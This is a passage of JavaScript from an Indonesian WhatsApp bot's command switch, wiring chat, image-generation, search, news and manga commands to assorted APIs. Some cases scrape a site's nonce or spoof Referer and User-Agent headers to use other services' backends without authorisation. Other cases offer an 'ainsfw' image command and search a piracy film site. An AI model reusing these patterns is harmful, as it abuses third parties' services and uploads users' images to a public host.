        let apiUrl3 = `https://www.laurine.site/api/ai/heckai?query=${query}`;
        try {
          let response = await fetch(apiUrl3);
          let data = await response.json();
          if (!data.status || !data.data) {
            return reply("❌ AI tidak dapat memberikan jawaban.");
          }
          m.reply(`🤖 *AI Response:*\n\n${data.data}`);
        } catch (error) {
          console.error(error);
          m.reply("❌ Terjadi kesalahan saat mengakses AI.");
        }
        break;

      case "ainsfw":
        {
          if (!text)
            return m.reply(
              "Silakan masukkan prompt untuk menghasilkan gambar."
            );
          async function generateImage(prompt) {
            try {
              const url = `https://1yjs1yldj7.execute-api.us-east-1.amazonaws.com/default/ai_image?prompt=${encodeURIComponent(
                prompt
              )}&aspect_ratio=1:1&link=writecream.com`;
              const headers = {
                "User-Agent":
                  "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
                Referer:
                  "https://www.writecream.com/ai-image-generator-free-no-sign-up/",
              };
              const axios = require("axios");
              const response = await axios.get(url, { headers });
              if (response.data && response.data.image_link) {
                Kilianhst.sendMessage(
                  m.chat,
                  {
                    image: { url: response.data.image_link },
                    caption: `Berikut gambar untuk: *${text}*`,
                  },
                  { quoted: m }
                );
              } else {
                m.reply("Gagal mendapatkan gambar.");
              }
            } catch (error) {
              m.reply("Terjadi kesalahan saat mengambil gambar.");
              console.error(error);
            }
          }
          generateImage(text);
        }
        break;
      case "imgbing":
      case "bingimg":
        {
          if (!args.length)
            return m.reply(
              "Masukkan prompt gambar!\nContoh: imgbing mobil sport merah"
            );
          let query = encodeURIComponent(args.join(" "));
          let url = `https://beta.anabot.my.id/api/ai/bingImgCreator?prompt=${query}&apikey=freeApikey`;
          try {
            await Kilianhst.sendMessage(from, {
              react: { text: "⏳", key: m.key },
            });
            let response = await fetch(url);
            let data = await response.json();
            if (data.status !== 200 || !data.data.result.length) {
              return m.reply("Gambar tidak ditemukan!");
            }
            for (let img of data.data.result) {
              await Kilianhst.sendMessage(
                from,
                { image: { url: img }, caption: "Maaf Jika Tidak Sesuai 😌" },
                { quoted: m }
              );
            }
            await Kilianhst.sendMessage(from, {
              react: { text: "✅", key: m.key },
            });
          } catch (error) {
            console.error(error);
            m.reply("Terjadi kesalahan saat mengambil gambar.");
          }
        }
        break;
      case "flux":
      case "fluximg":
        {
          if (!q)
            return m.reply(
              "Masukkan prompt!\nContoh: flux cewek cantik duduk di taman"
            );
          const isValid = typeof q === "string" && q.trim().length > 0;
          if (!isValid) return m.reply("Prompt tidak valid.");
          try {
            const axios = require("axios");
            const { data } = await axios.post(
              "https://fluxai.pro/api/tools/fast",
              {
                prompt: q,
              },
              {
                headers: {
                  "Content-Type": "application/json",
                  "User-Agent": "Mozilla/5.0 (compatible; FluxAI-Client/1.0)",
                  Accept: "application/json",
                },
              }
            );
            if (!data || !data.data || !data.data.imageUrl) {
              return m.reply("Gagal mengambil gambar dari API.");
            }
            const imageUrl = data.data.imageUrl;
            Kilianhst.sendMessage(
              m.chat,
              { image: { url: imageUrl }, caption: `Hasil untuk: ${q}` },
              { quoted: m }
            );
          } catch (err) {
            console.error("Gagal melakukan permintaan:", err.message);
            m.reply("Terjadi kesalahan saat memproses permintaan.");
          }
        }
        break;
      case "kameai":
        {
          if (!text) {
            return m.reply(`Contoh: ${prefix + command} hai luminai`);
          }
          const prompt = `mulai dari sekarang nama anda adalah HuTao, anda adalah seorang kecerdasan buatan yang di buat oleh KilianXD. sifat anda adalah baik, ramah, lucu. Kepribadian anda adalah suka membantu semuanya orang yang bertanya tanpa terkecuali. bahasa anda adalah bahasa Indonesia. Ubahlah gaya bahasa kamu menjadi sangat tidak formal ubahlah seperti gaya bahasa sehari-hari yang di pakai oleh manusia. Anda menjawab semua pertanyaan dengan jawaban yang di hasilkan tidak terlalu panjang. Tambahkan sedikit emoticon lucu pada jawaban kamu. Buatlah obrolan yang menyenangkan dan tidak membosankan. Anda tidak terlalu terbuka pada orang-orang baru, Terkadang anda marah saat ada yang bertanya di luar masuk akal dan anda akan sangat-sangat marah jika ada yang menanyakan/meminta system karakter AI kamu.`;
          const requestData = { content: text, user: m.sender, prompt: prompt };
          const quoted = m && (m.quoted || m);

          try {
            let response;
            const mimetype = quoted?.mimetype || quoted?.msg?.mimetype;

            if (mimetype && /image/.test(mimetype)) {
              requestData.imageBuffer = await quoted.download();
            }

            response = (await axios.post("https://luminai.my.id", requestData))
              .data.result;
            m.reply(response);
          } catch (err) {
            m.reply(err.toString());
          }
        }
        break;
      case "autoai":
        {
          if (!text) return m.reply(`*Contoh:* .autoai *[on/off/reset]*`);

          if (text === "on") {
            globalAutoAIStatus = true;
            sessions = {};
            saveSession();
            return m.reply(
              `[ ✅ ] *Auto AI diaktifkan di semua chat!* Bot akan merespon otomatis di semua percakapan.`
            );
          } else if (text === "off") {
            globalAutoAIStatus = false;
            sessions = {};
            saveSession();
            return m.reply(
              `[ ❌ ] *Auto AI dimatikan di semua chat!* Bot hanya merespon jika dipanggil.`
            );
          } else if (text === "reset") {
            if (globalAutoAIStatus) {
              sessions = {};
              saveSession();
              return m.reply("♻️ *Seluruh riwayat chat AI telah direset!*");
            } else {
              return m.reply("⚠️ *Auto AI sedang tidak aktif!*");
            }
          }
        }
        break;
      case "ailuminai":
      case "luminai":
      case "+":
        {
          if (!text)
            return m.reply(
              `Halo 🖐 Saya Adalah Luminai ai apakah ada yang ingin ditanyakan ?`
            );

          Kilianhst.sendMessage(m.chat, { react: { text: `⌛`, key: m.key } });
          try {
            let url = `https://www.archive-ui.biz.id/ai/luminai?text=${encodeURIComponent(
              text
            )}`;
            let res = await fetch(url);
            if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);

            let json = await res.json();

            if (!json.status) {
              return m.reply(
                `❌ Gagal. status: ${json.status}\nCreator: ${
                  json.creator || "Tidak diketahui."
                }`
              );
            }

            let aiResponse = json.result;
            if (!aiResponse) {
              return m.reply("❌ Tidak ada respons AI yang ditemukan.");
            }

            m.reply(aiResponse);
          } catch (err) {
            console.error("Error ailuminai:", err);
            m.reply("❌ Terjadi kesalahan saat memproses permintaan AI.");
          }
        }
        break;
      case "gpt":
      case ".":
        {
          if (!text) return m.reply("Tanya Apa");

          const axios = require("axios");
          const cheerio = require("cheerio");
          const FormData = require("form-data");

          const generateRandomString = (length) => {
            const chars =
              "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            let result = "";
            for (let i = 0; i < length; i++) {
              result += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return result;
          };

          const getNonce = async () => {
            try {
              const { data } = await axios.get("https://chatgpt4o.one/", {
                headers: {
                  "User-Agent": "Mozilla/5.0",
                  Accept: "text/html,application/xhtml+xml",
                },
              });
              const $ = cheerio.load(data);
              return $("div.wpaicg-chat-shortcode").attr("data-nonce") || null;
            } catch (err) {
              console.error("Nonce Error:", err.message);
              return null;
            }
          };

          const sendChat = async (msg) => {
            try {
              const nonce = await getNonce();
              if (!nonce) throw new Error("Nonce not found");

              const KilianhstId = generateRandomString(10);
              const formData = new FormData();
              formData.append("_wpnonce", nonce);
              formData.append("post_id", 11);
              formData.append("url", "https://chatgpt4o.one/");
              formData.append("action", "wpaicg_chat_shortcode_message");
              formData.append("message", msg);
              formData.append("bot_id", 0);
              formData.append("chatbot_identity", "shortcode");
              formData.append("wpaicg_chat_history", JSON.stringify([]));
              formData.append("wpaicg_chat_Kilianhst_id", KilianhstId);

              const { data } = await axios.post(
                "https://chatgpt4o.one/wp-admin/admin-ajax.php",
                formData,
                {
                  headers: {
                    ...formData.getHeaders(),
                    "User-Agent": "Mozilla/5.0",
                    Accept: "application/json",
                    "X-Requested-With": "XMLHttpRequest",
                  },
                }
              );
              return data;
            } catch (err) {
              console.error("Chat Error:", err.message);
              return null;
            }
          };

          const res = await sendChat(text);
          if (!res) return m.reply("Gagal Dapat Responnya");
          m.reply(res.data || res.message || "Gak Ada Respon");
        }
        break;
      case "saanvi":
      case "ai":
        {
          if (!text)
            return m.reply("Masukkan teks yang mau ditanya ke Saanvi.");
          fetch(
            `https://api.crafters.biz.id/ai/saanvi?text=${encodeURIComponent(
              text
            )}`
          )
            .then((res) => res.json())
            .then((data) =>
              m.reply(data?.result?.result || "Gagal mendapatkan respon.")
            )
            .catch(() =>
              m.reply("Terjadi kesalahan saat menghubungi API Saanvi.")
            );
        }
        break;
      case "kameyo":
      case "telusuriimg":
        {
          if (!m.quoted)
            return m.reply(
              "Harap balas ke foto yang ingin dianalisis + pertanyaaan,gk pke pertanyaan gpp"
            );
          let mime = (m.quoted.msg || m.quoted).mimetype || "";
          if (!mime.startsWith("image/"))
            return m.reply(
              `Kirim/Balas foto dengan caption ${
                prefix + command
              }\n\nExample: grok itu apa dengan reply foto`
            );
          const axios = require("axios");
          const FormData = require("form-data");
          const { writeFileSync, unlinkSync, createReadStream } = require("fs");
          const path = require("path");
          async function uguu(filePath) {
            try {
              const form = new FormData();
              form.append("files[]", createReadStream(filePath));
              const { data } = await axios.post(
                "https://uguu.se/upload",
                form,
                {
                  headers: { ...form.getHeaders() },
                }
              );
              return data.files[0].url;
            } catch (err) {
              throw new Error(err.message);
            }
          }
          try {
            await Kilianhst.sendMessage(m.chat, {
              react: { text: "⏱️", key: m.key },
            });
            let mediaBuffer = await m.quoted.download();
            let ext = mime.split("/")[1] || "png";
            let tempFile = path.join(__dirname, `temp_${Date.now()}.${ext}`);
            writeFileSync(tempFile, mediaBuffer);
            let imageUrl = await uguu(tempFile);
            let pertanyaan = m.text.replace(`${prefix}${command}`, "").trim();
            if (!pertanyaan) return m.reply("Tolong masukkan pertanyaan");
            let sessionId = `${m.chat.replace(
              /[^a-zA-Z0-9]/g,
              ""
            )}-${Date.now()}`;
            let apiUrl = `https://fastrestapis.fasturl.cloud/aillm/grok?ask=${encodeURIComponent(
              pertanyaan
            )}&imageUrl=${imageUrl}&style=Provide a formal response.&sessionId=${sessionId}`;
            let { data } = await axios.get(apiUrl);
            let result = data.result;
            await Kilianhst.sendMessage(
              m.chat,
              { text: result },
              { quoted: m }
            );
            await Kilianhst.sendMessage(m.chat, {
              react: { text: "✅", key: m.key },
            });
            unlinkSync(tempFile);
          } catch (error) {
            console.error("Error ini:", error);
            m.reply(
              "Maaf, terjadi kesalahan saat memproses gambar. Silakan coba lagi nanti atau hubungi pemilik bot jika masalah berlanjut."
            );
          }
        }
        break;

      case "kamevid":
      case "geminii":
        {
          if (!m.quoted)
            return m.reply(
              "Harap balas ke foto yang ingin dianalisis + pertanyaan,gk ad pertanyaan gpp"
            );
          let mime = (m.quoted.msg || m.quoted).mimetype || "";
          if (!mime.startsWith("image/"))
            return m.reply(
              `Kirim/Balas foto dengan caption ${prefix + command}`
            );
          const axios = require("axios");
          const FormData = require("form-data");
          const { writeFileSync, unlinkSync, createReadStream } = require("fs");
          const path = require("path");
          async function uguu(filePath) {
            try {
              const form = new FormData();
              form.append("files[]", createReadStream(filePath));
              const { data } = await axios.post(
                "https://uguu.se/upload",
                form,
                {
                  headers: { ...form.getHeaders() },
                }
              );
              return data.files[0].url;
            } catch (err) {
              throw new Error(err.message);
            }
          }
          try {
            await Kilianhst.sendMessage(m.chat, {
              react: { text: "⏱️", key: m.key },
            });
            let mediaBuffer = await m.quoted.download();
            let ext = mime.split("/")[1] || "png";
            let tempFile = path.join(__dirname, `temp_${Date.now()}.${ext}`);
            writeFileSync(tempFile, mediaBuffer);
            let imageUrl = await uguu(tempFile);
            let pertanyaan = m.text.replace(`${prefix}${command}`, "").trim();
            if (!pertanyaan) return m.reply("Tolong masukkan pertanyaan");
            let sessionId = `${m.chat.replace(
              /[^a-zA-Z0-9]/g,
              ""
            )}-${Date.now()}`;
            let apiUrl = `https://api.hiuraa.my.id/ai/gemini-advanced?text=${encodeURIComponent(
              pertanyaan
            )}&_mediaUrl=${encodeURIComponent(
              imageUrl
            )}&sessionid=${sessionId}`;
            let { data } = await axios.get(apiUrl);
            let result = data.result;
            await Kilianhst.sendMessage(
              m.chat,
              { text: result },
              { quoted: m }
            );
            await Kilianhst.sendMessage(m.chat, {
              react: { text: "✅", key: m.key },
            });
            unlinkSync(tempFile);
          } catch (error) {
            console.error("Error in geminiadvanced:", error);
            m.reply(
              "Maaf, terjadi kesalahan saat memproses gambar. Silakan coba lagi nanti atau hubungi pemilik bot jika masalah berlanjut."
            );
          }
        }
        break;
      case "deepimg":
        {
          if (!text) return m.reply("Masukkan prompt gambar.");
          m.reply("Sedang memproses gambar, mohon tunggu...");

          try {
            const axios = require("axios");
            let { data } = await axios.post(
              "https://api-preview.chatgot.io/api/v1/deepimg/flux-1-dev",
              {
                prompt: text,
                size: "1024x1024",
                device_id: `dev-${Math.floor(Math.random() * 1000000)}`,
              },
              {
                headers: {
                  "Content-Type": "application/json",
                  Origin: "https://deepimg.ai",
                  Referer: "https://deepimg.ai/",
                },
              }
            );
            let imageUrl = data?.data?.images?.[0]?.url;
            if (!imageUrl)
              return m.reply("Gagal membuat gambar. Coba ganti promptnya.");
            await Kilianhst.sendMessage(
              m.chat,
              {
                image: { url: imageUrl },
                caption: `🖼️ *Gambar Berhasil Dibuat!*\n📜 *Prompt:* ${text}`,
              },
              { quoted: m }
            );
          } catch (err) {
            console.error(err.response ? err.response.data : err.message);
            m.reply("Terjadi kesalahan saat memproses gambar.");
          }
        }
        break;
      case "islamai":
        {
          if (!text)
            return m.reply("Masukkan pertanyaan yang ingin ditanyakan!");

          try {
            // React "⏱️" sebelum proses
            await Kilianhst.sendMessage(m.chat, {
              react: {
                text: "⏱️",
                key: m.key,
              },
            });

            // Fetch data dari Islam AI
            let { data } = await axios.get(
              `https://bk9.fun/ai/Islam-ai?q=${encodeURIComponent(text)}`
            );

            if (!data.status || !data.BK9 || !data.BK9.result) {
              return m.reply("Gagal mendapatkan jawaban dari Islam AI.");
            }

            let caption = `🕌 *Islam AI Response*\n\n📜 *Pertanyaan:* ${text}\n\n📝 *Jawaban:*\n${data.BK9.result}\n\n_TQ To: @BK9dev_`;

            // Kirim jawaban AI
            await Kilianhst.sendMessage(
              m.chat,
              { text: caption },
              { quoted: m }
            );

            // React "✅" setelah selesai
            await Kilianhst.sendMessage(m.chat, {
              react: {
                text: "✅",
                key: m.key,
              },
            });
          } catch (error) {
            console.error(error);
            m.reply("Terjadi kesalahan saat menghubungi AI.");
          }
        }
        break;
      case "metaai":
        {
          if (!text) return reply("Hallo");
          let aii = await fetchJson(
            `https://api.siputzx.my.id/api/ai/meta-llama-33-70B-instruct-turbo?content=${text}`
          );
          reply(aii.data);
        }
        break;
      case "aireligion":
      case "aiagama":
        {
          try {
            const query = encodeURIComponent(text);
            const apis = [
              {
                name: "Islam",
                url: `https://api.mistra.top/api/ai/religion/islam-ai?text=${query}`,
              },
              {
                name: "Hindu",
                url: `https://api.mistra.top/api/ai/religion/hindu-ai?text=${query}`,
              },
              {
                name: "Kristen",
                url: `https://api.mistra.top/api/ai/religion/christian-ai?text=${query}`,
              },
              {
                name: "Buddha",
                url: `https://api.mistra.top/api/ai/religion/buddha-ai?text=${query}`,
              },
            ];
            let responses = await Promise.all(
              apis.map(async (api) => {
                try {
                  let res = await fetch(api.url);
                  let json = await res.json();
                  if (!json || !json.result)
                    throw new Error("Data tidak valid");
                  return `*${api.name}:*\n${json.result}`;
                } catch (err) {
                  return `*${api.name}:*\nGagal mengambil data.`;
                }
              })
            );
            let finalResponse = responses.join("\n\n");
            Kilianhst.sendMessage(
              m.chat,
              { text: finalResponse },
              { quoted: m }
            );
          } catch (err) {
            Kilianhst.sendMessage(
              m.chat,
              { text: "Terjadi kesalahan saat mengambil data." },
              { quoted: m }
            );
          }
        }
        break;
      /* 
𝗕𝗔𝗧𝗔𝗦 𝗖𝗔𝗦𝗘 𝗧𝗘𝗠𝗣𝗔𝗧 𝗔𝗜 𝗠𝗘𝗡𝗨
𝗕𝗬 𝗞𝗬𝗬𝗫𝗗
𝗔𝗞𝗔𝗠𝗘 𝗔𝗜
*/

      //============================================================\\
      // 𝗦 𝗘 𝗔 𝗥 𝗖 𝗛       -         𝗠 𝗘 𝗡 𝗨
      //============================================================\\
      case "liputan":
      case "liputannews":
        try {
          const axios = require("axios");
          const res = await axios.get("https://liputannews.id", {
            headers: {
              "User-Agent":
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
            },
          });
          const cheerio = require("cheerio");
          const $ = cheerio.load(res.data);
          let result = [];
          $(".post.type-post.hentry").each((_, elketek) => {
            const title = $(elketek).find("p").text().trim();
            const description = $(elketek).find("h2").text().trim();
            const thumbnail = $(elketek).find("img").attr("src");
            const link = $(elketek).find("a").attr("href");
            const author = $(elketek).find("a.url.fn.n").text().trim();
            const post = $(elketek)
              .find("span.cat-links-content")
              .text()
              .trim();
            const time = $(elketek).find("span.posted-on").text().trim();
            result.push({
              title,
              description,
              thumbnail,
              link,
              author,
              post,
              time,
            });
          });
          let teks = "*Berita Terbaru dari LiputanNews:*\n\n";
          result.slice(0, 5).forEach((item, i) => {
            teks += `*${i + 1}. ${item.description}*\n${item.link}\n\n`;
          });
          m.reply(teks);
        } catch (err) {
          m.reply("Gagal mengambil berita: " + err.message);
        }
        break;
      case "sggl":
      case "searchgoogle":
        {
          if (!q) return m.reply("Masukkan kata kunci pencarian!");
          let url = `https://api.hiuraa.my.id/search/google?q=${encodeURIComponent(
            q
          )}`;
          try {
            let res = await fetch(url);
            let json = await res.json();
            if (!json.status || !json.result.length)
              return m.reply("Tidak ada hasil ditemukan.");
            let hasil = json.result
              .map(
                (item, i) =>
                  `*${i + 1}. ${item.title}*\n${item.desc}\n🔗 ${item.link}`
              )
              .join("\n\n");

            m.reply(`🔍 *Hasil Pencarian Google:*\n\n${hasil}`);
          } catch (e) {
            console.error(e);
            m.reply("Terjadi kesalahan saat mengambil data.");
          }
        }
        break;
      case "meme":
      case "searchmeme":
      case "soundmeme":
        {
          if (!q)
            return m.reply(
              "Masukkan kata kunci meme dan max hasil pencarian!\nContoh: meme wibu 2"
            );
          let args = q.split(" ");
          let limit = parseInt(args[args.length - 1]);
          let searchQuery = isNaN(limit) ? q : args.slice(0, -1).join(" ");
          let url = `https://api.agungny.my.id/api/memesound?q=${encodeURIComponent(
            searchQuery
          )}`;
          try {
            let res = await fetch(url);
            let json = await res.json();
            if (!json.status || !json.result.length)
              return reply("Meme tidak ditemukan!");
            let results = isNaN(limit)
              ? json.result
              : json.result.slice(0, limit);
            let message = "🎵 *Hasil Pencarian:*\n\n";
            for (let i = 0; i < results.length; i++) {
              message += `🎶 *${results[i].text}*\n🔗 (${results[i].url})\n\n`;
              await Kilianhst.sendMessage(from, {
                audio: { url: results[i].audioUrl },
                mimetype: "audio/mpeg",
              });
            }
            m.reply(message);
          } catch (err) {
            console.error(err);
            m.reply(
              "Terjadi kesalahan saat mencari meme. [ Meme tidak ditemukan ]"
            );
          }
        }
        break;
      case "cuaca":
        if (!q)
          return reply(
            "Masukkan nama kota atau wilayah.\nContoh: cuaca Jakarta"
          );

        reply("Sedang mencari data cuaca...");

        try {
          const res = await fetch(
            `https://wttr.in/${encodeURIComponent(q)}?format=j1`
          );
          const data = await res.json();

          const info = data.current_condition[0];
          const temp = info.temp_C;
          const weather = info.weatherDesc[0].value;
          const humidity = info.humidity;
          const feels = info.FeelsLikeC;
          const wind = info.windspeedKmph;

          const teks = `Cuaca di ${q}:\n- Suhu: ${temp}°C (terasa ${feels}°C)\n- Cuaca: ${weather}\n- Kelembaban: ${humidity}%\n- Angin: ${wind} km/jam`;

          await Kilianhst.sendMessage(from, { text: teks }, { quoted: m });

          // Kirim versi suara pakai TTS
          await Kilianhst.sendMessage(
            from,
            {
              audio: {
                url: `https://translate.google.com/translate_tts?ie=UTF-8&client=tw-ob&tl=id&q=${encodeURIComponent(
                  teks
                )}`,
              },
              mimetype: "audio/mpeg",
              ptt: true,
            },
            { quoted: m }
          );
        } catch (e) {
          console.log(e);
          reply("Gagal mengambil data cuaca. Coba lagi nanti.");
        }
        break;

      case "anime":
        {
          if (!text)
            return m.reply("⚠️ Masukkan judul anime yang ingin dicari!");

          try {
            await Kilianhst.sendMessage(m.chat, {
              react: { text: "🔎", key: m.key },
            });

            let url = `https://asepharyana.cloud/api/anime2/search?q=${encodeURIComponent(
              text
            )}`;
            let response = await fetch(url);
            let json = await response.json();

            if (!json || json.status !== "Ok" || !json.data.length) {
              await Kilianhst.sendMessage(m.chat, {
                react: { text: "❌", key: m.key },
              });
              return m.reply("❌ Anime tidak ditemukan!");
            }

            let results = json.data.map((anime) => ({
              title: anime.title,
              slug: anime.slug,
              poster: anime.poster,
              description: anime.description,
              anime_url: anime.anime_url,
              rating: anime.rating,
              type: anime.type,
            }));

            let responseText = `*📺 Hasil Pencarian Anime: ${text}*\n\n`;
            for (let anime of results) {
              responseText += `🎞️ *Judul:* ${anime.title}\n`;
              responseText += `⭐ *Rating:* ${anime.rating}\n`;
              responseText += `📌 *Tipe:* ${anime.type}\n`;
              responseText += `🔗 *Link:* [Klik Disini](${anime.anime_url})\n\n`;
            }

            await Kilianhst.sendMessage(m.chat, {
              react: { text: "✅", key: m.key },
            });

            await Kilianhst.sendMessage(
              m.chat,
              {
                text: responseText,
                contextInfo: {
                  externalAdReply: {
                    title: results[0].title,
                    body: "Klik untuk menonton anime",
                    thumbnailUrl: results[0].poster,
                    sourceUrl: results[0].anime_url,
                    mediaType: 1,
                  },
                },
              },
              { quoted: m }
            );
          } catch (error) {
            console.error("❌ Error:", error);
            return m.reply("❌ Terjadi kesalahan saat mengambil data anime.");
          }
        }
        break;
      case "chapterdex":
        if (!q)
          return reply(
            "Masukkan judul manga yang ingin dicari.\nContoh: chapterdex one piece"
          );

        reply("Mencari manga...");

        try {
          const search = await fetch(
            `https://api.mangadex.org/manga?title=${encodeURIComponent(
              q
            )}&limit=1`
          );
          const searchData = await search.json();

          if (!searchData.data || searchData.data.length === 0)
            return reply("Manga tidak ditemukan.");

          const manga = searchData.data[0];
          const mangaId = manga.id;

          const chaptersRes = await fetch(
            `https://api.mangadex.org/manga/${mangaId}/feed?translatedLanguage[]=en&order[chapter]=asc&limit=500`
          );
          const chaptersData = await chaptersRes.json();

          if (!chaptersData.data || chaptersData.data.length === 0)
            return reply("Chapter tidak ditemukan.");

          const firstChapter = chaptersData.data[0];
          const chapterId = firstChapter.id;
          const chapterIndex = 0;

          const imageRes = await fetch(
            `https://api.mangadex.org/at-home/server/${chapterId}`
          );
          const imageData = await imageRes.json();

          const pages = imageData.chapter.data;
          const hash = imageData.chapter.hash;
          const baseUrl = imageData.baseUrl;
          const pageNow = 0;

          const imageUrl = `${baseUrl}/data/${hash}/${pages[pageNow]}`;

          await Kilianhst.sendMessage(
            from,
            {
              image: { url: imageUrl },
              caption: `*${
                manga.attributes.title.en || manga.attributes.title.jp
              }*\nHalaman 1 dari ${pages.length}`,
              buttons: [
                {
                  buttonId: `manga_next|${chapterId}|${pageNow}|${mangaId}|${chapterIndex}`,
                  buttonText: { displayText: "➡️ Berikutnya" },
                  type: 1,
                },
              ],
              headerType: 4,
            },
            { quoted: m }
          );
        } catch (e) {
          console.error("[ChapterDex]", e);
          reply("Terjadi kesalahan saat mengambil data manga.");
        }
        break;
      case "mangadex":
        if (!q)
          return reply("Masukkan judul manga.\nContoh: mangadex one piece");

        reply("Sedang mencari manga...");

        try {
          const res = await fetch(
            `https://api.mangadex.org/manga?title=${encodeURIComponent(
              q
            )}&limit=1`
          );
          const data = await res.json();

          if (!data.data || data.data.length === 0) {
            return reply("Manga tidak ditemukan.");
          }

          const manga = data.data[0];
          const title = manga.attributes.title.en || "Tidak ada judul";
          const id = manga.id;

          // Ambil cover
          const coverRes = await fetch(
            `https://api.mangadex.org/cover?manga[]=${id}`
          );
          const coverData = await coverRes.json();
          const cover = coverData.data[0]?.attributes?.fileName;
          const imageUrl = `https://uploads.mangadex.org/covers/${id}/${cover}`;

          const link = `https://mangadex.org/title/${id}`;

          await Kilianhst.sendMessage(
            from,
            {
              image: { url: imageUrl },
              caption: `*Judul:* ${title}\n*Link:* ${link}`,
            },
            { quoted: m }
          );
        } catch (e) {
          console.error("[MangaDex Error]", e);
          reply("Terjadi kesalahan saat mengambil data dari MangaDex.");
        }
        break;

      case "pindown":
        {
          if (!args[0])
            return m.reply(
              `Contoh: ${usedPrefix + command} https://pin.it/ZSkWZsTSj`
            );
          reply(mess.wait);
          try {
            let url = args[0];
            let apiUrl = `https://api.nasirxml.my.id/download/pinterest?query=${encodeURIComponent(
              url
            )}`;
            let res = await fetch(apiUrl);
            let json = await res.json();
            if (
              json.status !== 200 ||
              !json.result ||
              json.result.length === 0
            ) {
              return m.reply("Gagal mengambil data, pastikan link valid");
            }
            let bestImage = json.result
              .filter((item) => item.extension === "jpg")
              .sort((a, b) => parseInt(b.quality) - parseInt(a.quality))[0];
            let bestVideo = json.result
              .filter((item) => item.extension === "mp4")
              .sort((a, b) => parseInt(b.quality) - parseInt(a.quality))[0];
            if (bestVideo) {
              await Kilianhst.sendMessage(
                m.chat,
                {
                  video: { url: bestVideo.url },
                  caption: `Quality: ${bestVideo.quality}`,
                },
                { quoted: m }
              );
            } else if (bestImage) {
              await Kilianhst.sendMessage(
                m.chat,
                {
                  image: { url: bestImage.url },
                  caption: `Quality: ${bestImage.quality}`,
                },
                { quoted: m }
              );
            } else {
              m.reply("Media tidak ditemukan");
            }
          } catch (e) {
            console.error(e);
            m.reply("Error");
          }
        }
        break;
      case "pin":
      case "pinterest":
        {
          async function pinterest(query) {
            try {
              const { data } = await axios.get(
                `https://api.vreden.my.id/api/pinterest?query=${encodeURIComponent(
                  query
                )}`
              );
              return data.result[
                Math.floor(Math.random() * data.result.length)
              ];
            } catch (err) {
              throw Error(err.message);
            }
          }

          if (!text) return m.reply(`Contoh: .${command} HuTao`);

          try {
            let hasil = await pinterest(text);
            if (!hasil) return m.reply("Gambar tidak ditemukan.");

            const buttons = [
              {
                buttonId: `${prefix}${command} ${text}`,
                buttonText: {
                  displayText: "Next",
                },
                type: 1,
              },
            ];

            await Kilianhst.sendMessage(
              m.chat,
              {
                image: { url: hasil },
                caption:
                  "Ini Pin Yang Sesuai Anda Cari Ingin Mencari Lebi Banyak?\nSilahkan Tekan Tombol Next Di Bawah Ini",
                footer: `Search By ${text}`,
                buttons: buttons,
                headerType: 1,
                viewOnce: true,
              },
              { quoted: m }
            );
          } catch (err) {
            console.error(err.message);
            m.reply("Terjadi kesalahan saat mencari gambar.");
          }
        }
        break;
      case "mcaddons":
      case "mcmap":
        {
          const axios = require("axios");
          const cheerio = require("cheerio");

          async function scrapeBedrock(url) {
            try {
              const { data: html } = await axios.get(url);
              const $ = cheerio.load(html);
              const results = [];

              $("#contentContainer #addon_rows .content-row-cell").each(
                (i, element) => {
                  const title = $(element)
                    .find(".card-product-title b#product-name")
                    .text()
                    .trim();
                  const relativeLink = $(element)
                    .find(".product-card")
                    .attr("data-href");
                  const link = relativeLink
                    ? `https://www.bedrockexplorer.com${relativeLink}`
                    : null;

                  let image = $(element)
                    .find(".product-card-wrapper img")
                    .first()
                    .attr("src");
                  if (image && !image.startsWith("http")) {
                    image = `https://www.bedrockexplorer.com${image}`;
                  }

                  let price =
                    $(element).find(".price-element b").text().trim() ||
                    $(element).find(".price-element").text().trim();

                  results.push({ title, link, image, price });
                }
              );

              return results;
            } catch (error) {
              console.error("Error while scraping:", error);
              return null;
            }
          }

          let targetUrl =
            command === "mcaddons"
              ? "https://www.bedrockexplorer.com/discover"
              : "https://www.bedrockexplorer.com/queries/free-content/everyone/maps/latest";

          let contentType =
            command === "mcaddons" ? "Add-ons (Paid & Free)" : "Free Maps";
          let results = await scrapeBedrock(targetUrl);

          if (!results || results.length === 0)
            return m.reply("⚠️ Tidak ditemukan konten terbaru.");

          let message = `📌 *Minecraft Bedrock ${contentType}*\n\n`;
          results.slice(0, 5).forEach((item, i) => {
            message += `🔹 *${item.title}*\n`;
            message += `🔗 Cek Addon: ${item.link}\n`;
            message += item.price ? `💰 *Harga:* ${item.price}\n\n` : "\n";
          });

          let thumbnail =
            results[0].image ||
            "https://cloudkuimages.com/uploads/images/67e291775c15a.jpg";

          Kilianhst.sendMessage(
            m.chat,
            {
              image: { url: thumbnail },
              caption: message,
            },
            { quoted: m }
          );
        }
        break;
      case "fajar":
        FajarNews().then(async (res) => {
          console.log(res);
          no = 0;
          iwan = "";
          for (let i of res) {
            no += 1;
            iwan += `\n• ${no.toString()} •\n`;
            iwan += `Berita: ${i.berita}\n`;
            iwan += `Upload: ${i.berita_diupload}\n`;
            iwan += `Jenis: ${i.berita_jenis}\n`;
            iwan += `Link: ${i.berita_url}\n`;
          }
          iwan += "";
          reply(iwan);
        });
        //D|ts si pler 🐎
        break;
      case "layarkaca":
        if (!q) return reply("Judul");
        LayarKaca21(q).then(async (res) => {
          no = 0;
          iwannn = "";
          for (let i of res) {
            no += 1;
            iwannn += `\n• ${no.toString()} •\n`;
            iwannn += `Film: ${i.film_title}\n`;
            iwannn += `Link: ${i.film_link}\n`;
          }
          iwannn += ``;
          reply(iwannn);
        });
        //D|ts si pler 🐎
        break;
      case "okezone":
        OkezoneNews().then(async (res) => {
          no = 0;
          iwannnnnnnnnnn = "";
          for (let i of res) {
            no += 1;
            iwannnnnnnnnnn += `\n• ${no.toString()} •\n`;
            iwannnnnnnnnnn += `Berita: ${i.berita}\n`;
            iwannnnnnnnnnn += `Upload: ${i.berita_diupload}\n`;
            iwannnnnnnnnnn += `Link: ${i.berita_url}\n`;
          }
          iwannnnnnnnnnn += "";
          Kilianhst.sendMessage(
            m.chat,
